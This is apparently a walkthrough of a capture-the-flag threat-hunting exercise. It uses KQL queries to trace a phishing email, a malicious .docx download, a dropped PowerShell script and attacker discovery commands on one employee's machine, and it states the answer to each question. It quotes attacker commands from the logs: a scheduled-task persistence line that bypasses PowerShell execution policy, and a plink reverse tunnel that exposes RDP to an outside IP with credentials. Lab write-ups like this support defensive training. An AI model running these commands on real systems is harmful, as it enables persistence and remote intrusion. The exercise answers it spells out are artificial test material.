Next up is Section 3: Plenty of Phish.
What is Sonia Gose's job role?
Employees
| where name == "Sonia Gose"
| distinct role
Answer: Senior Editor

They supply a screenshot of a suspicious email Sonia received and I have to find the sender's email address on the screenshot:
newspaper_jobs@gmail.com

Then, look for this email in the logs and find the timestamp.
Email
| where recipient contains "sonia"
| where sender contains "newspaper_jobs"
This could be done several ways, really. I chose to filter emails by recipient (being Sonia - I didn't originally write down her email address, so I used this way) and sender being the address we just found.
There is only 1 hit: "timestamp": 2024-01-05T09:42:05.000Z

What URL was included in the email?
https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx

Sonia doesn't remember if she clicked this link or not, so let's find out ourselves. What is Sonia Gose's IP address?
Employees
| where name == "Sonia Gose"
Answer: 10.10.0.3

Did Sonia click on this link? If so, enter the timestamp when she clicked the link. If not, type "no".
OutboundNetworkEvents
| where src_ip == "10.10.0.3"
| where url == "https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx"
This gets only the traffic from Sonia's IP and to the potentially suspicious URL.
Answer: "timestamp": 2024-01-05T10:23:17.000Z
Looks like she did click it. The phishing email was successful so far, from the attacker's perspective.

What was the name of the docx file in the link that Sonia clicked?
Again, we know the link is: https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
So the file is: Valdorian_Times_Editorial_Offer_Letter.docx
So Sonia did download a file from the phishing link. It's likely this will have something malicious hiding in it, as well.

What is Sonia Gose's hostname?
Employees
| where name contains "Sonia"
| distinct hostname
Answer: UL0M-MACHINE

When did the downloaded docx file first show up on Sonia's machine?
FileCreationEvents
| where hostname contains "UL0M-MACHINE"
| where filename contains "Offer"
Answer: "timestamp": 2024-01-05T10:24:04.000Z

What was the full path of the docx file that was downloaded to Sonia's machine?
Answer: C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx

What is the sha256 hash of the file that Sonia downloaded?
60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f

What is the name of the file (.ps1) that was written to disk immediately after the docx was downloaded?
FileCreationEvents
| where hostname contains "UL0M-MACHINE"
| where filename contains ".ps1"
Answer: hacktivist_manifesto.ps1
My suspicion was correct; the downloaded file was hiding something else. And it looks like the actors are hacktivists on a mission.

When was this new file created?
"timestamp": 2024-01-05T10:24:32.000Z

What type of file is this (.ps1)?
From this reputable source (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-7.6) we find that PowerShell scripts have a .ps1 file extension.

We are then given a screenshot of the script. What does the attacker say to "let you know they are here"?
This comes straight from their image: lol ur bout 2 get pwnd...

According to the PowerShell script, what might be the hacker's favorite color?
Also from the image: green (because "green is a hackr color")

The purpose of the script is to invoke ____ and uncover da truth
Answer: Plink. Again, just from the image provided.

The next question points towards the ProcessEvents table, and asks how many Process Events are related to this PowerShell script on Sonia's machine:
ProcessEvents
| take 10 //This shows the columns that can potentially be queried
ProcessEvents
| where hostname contains "UL0M"
| where process_commandline contains ".ps1"
Answer: 3

What is the full command used to create the scheduled task? (It points us towards commands containing schtasks.exe, which creates scheduled tasks.)
Answer: schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"

What ExecutionPolicy is set in the command?
As shown above, it shows "-ExecutionPolicy Bypass", so the answer is Bypass.

Check ProcessEvents for evidence of plink.exe being executed on Sonia's machine. What IP address is used when plink is executed?
Adjust the query to read "plink" in place of ".ps1". Results show a process_commandline of: plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181

What username did the attacker use when connecting via plink?
The -l portion of the previous command shows the username being used: $had0w
(Source: https://man7.org/linux/man-pages/man1/ssh.1.html)

What password did the attacker use when connecting via plink?
Same referenced line as 2 questions above: thruthW!llS3tUfree

What six-letter command did the attackers run to figure out which user they are logged on as on the computer?
ProcessEvents
| where hostname contains "UL0M"
| where timestamp between (datetime(2024-01-06T02:39:35.000Z) .. datetime(2024-01-31T02:39:35.000Z))
This is to now look for activity between the timestamp of when the plink command was run (Jan 6) and an arbitrary time I picked: Jan 31. (The arbitrary time later is to be nearly certain that the activity is included).
The very next command after the plink command is "whoami".

How many discovery commands did the attackers run on this machine?
whoami, ipconfig, arp -a, tasklist /svc, and net view
That makes 5.

Now, we've hit a dead end. No other suspicious activity on this particular machine.
Do you think we can safely stop our investigation here? (yes/no)
No. There is still more to investigate and uncover.


